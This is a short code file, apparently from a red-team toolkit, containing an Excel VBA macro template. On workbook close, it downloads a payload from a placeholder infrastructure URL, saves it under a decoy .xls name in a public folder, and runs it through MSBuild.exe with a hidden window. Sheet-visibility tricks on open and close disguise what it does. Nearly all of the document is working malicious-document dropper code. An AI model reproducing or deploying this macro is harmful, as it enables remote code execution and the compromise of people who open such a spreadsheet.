<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
```vb
     Sub Auto_Open()
         'Do some things here to show/hide content
         Worksheets("Data").Visible = True
         Worksheets("Macro").Visible = False
     ErrorHandler:
         Exit Sub
     End Sub
     Sub Auto_Close()
         Debugging
         Worksheets("Macro").Visible = True
         Worksheets("Data").Visible = False
     End Sub
     Sub DownloadFile()
         Dim myURL As String
         'Change the next line
         myURL = "<INFRASTRUCTURE>"
         Dim WinHttpReq As Object
         Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
         WinHttpReq.Open "GET", myURL, False
         WinHttpReq.send
         myURL = WinHttpReq.responseBody
         If WinHttpReq.Status = 200 Then
             Set oStream = CreateObject("ADODB.Stream")
             oStream.Open
             oStream.Type = 1
             oStream.Write WinHttpReq.responseBody
             oStream.SaveToFile "C:\users\public\downloads\blogpage.xls", 2
             oStream.Close
         End If
     End Sub
     Public Function Debugging() As Variant
         DownloadFile
         'Will hide the MSBuild window
         Shell "C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\users\public\downloads\blogpage.xls", vbHide
     End Function
```